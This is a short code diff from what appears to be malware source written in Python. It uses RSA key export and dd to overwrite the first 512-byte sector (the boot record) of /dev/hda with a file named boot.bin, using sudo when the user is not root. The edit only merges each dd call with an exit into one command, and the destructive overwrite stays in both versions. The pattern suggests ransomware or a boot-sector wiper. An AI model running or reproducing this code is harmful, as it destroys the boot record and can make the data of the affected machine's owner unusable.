@@ -20,14 +20,12 @@ exKey = RSA.exportKey('PEM')
 
 if sys.platform == 'linux2' and gp.getuser() == 'root':
 	try:
-		os.system("dd if=boot.bin of=/dev/hda bs=512 count=1")
-		os.system("sleep 1 && exit")
+		os.system("dd if=boot.bin of=/dev/hda bs=512 count=1 && exit")
 	except:
 		pass	
 else:			
 	try:
-		os.system("sudo dd if=boot.bin of=/dev/hda bs=512 count=1")
-		os.system("sleep 1 && exit")
+		os.system("sudo dd if=boot.bin of=/dev/hda bs=512 count=1 && exit")
 	except:
 		pass
 
